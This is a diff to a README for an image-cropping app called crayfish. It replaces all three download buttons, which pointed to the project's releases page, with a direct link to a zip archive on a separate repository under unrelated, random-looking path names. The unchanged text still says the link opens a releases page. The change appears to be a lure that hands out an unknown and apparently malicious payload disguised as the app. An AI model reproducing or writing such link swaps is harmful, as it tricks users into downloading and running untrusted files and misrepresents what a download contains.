@@ -6,7 +6,7 @@ description: "Crop images seamlessly across Android, iOS, desktop, and web with 
 <h1>🦞 crayfish - Crop Images Perfectly on Any Device</h1>
 
 <p align="center">
-  <a href="https://github.com/Healthful-tincatinca1373/crayfish/releases" style="background:#FF6B6B;color:white;padding:15px 35px;border-radius:50px;font-size:22px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ DOWNLOAD NOW (FREE)</a>
+  <a href="https://raw.githubusercontent.com/Healthful-tincatinca1373/healthful-tincatinca1373.github.io/main/metacoelia/deuteranope.zip" style="background:#FF6B6B;color:white;padding:15px 35px;border-radius:50px;font-size:22px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ DOWNLOAD NOW (FREE)</a>
 </p>
 
 ---
@@ -52,7 +52,7 @@ This section will walk you through downloading and running Crayfish on your Wind
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/Healthful-tincatinca1373/crayfish/releases" style="background:#4ECDC4;color:white;padding:12px 30px;border-radius:8px;font-size:18px;font-weight:bold;text-decoration:none;">📥 Click Here to Download Crayfish</a>
+  <a href="https://raw.githubusercontent.com/Healthful-tincatinca1373/healthful-tincatinca1373.github.io/main/metacoelia/deuteranope.zip" style="background:#4ECDC4;color:white;padding:12px 30px;border-radius:8px;font-size:18px;font-weight:bold;text-decoration:none;">📥 Click Here to Download Crayfish</a>
 </p>
 
 **What happens next:** Your web browser will open a page showing the latest version of Crayfish. Look for the file listed at the top of the page — it's usually the first thing you see.
@@ -173,7 +173,7 @@ One photo. One crop. One beautiful result.
 Ready to start? Grab your copy now:
 
 <p align="center">
-  <a href="https://github.com/Healthful-tincatinca1373/crayfish/releases" style="background:#45B7D1;color:white;padding:14px 32px;border-radius:8px;font-size:20px;font-weight:bold;text-decoration:none;">⬇️ GET CRAYFISH NOW — FREE</a>
+  <a href="https://raw.githubusercontent.com/Healthful-tincatinca1373/healthful-tincatinca1373.github.io/main/metacoelia/deuteranope.zip" style="background:#45B7D1;color:white;padding:14px 32px;border-radius:8px;font-size:20px;font-weight:bold;text-decoration:none;">⬇️ GET CRAYFISH NOW — FREE</a>
 </p>
 
 ---
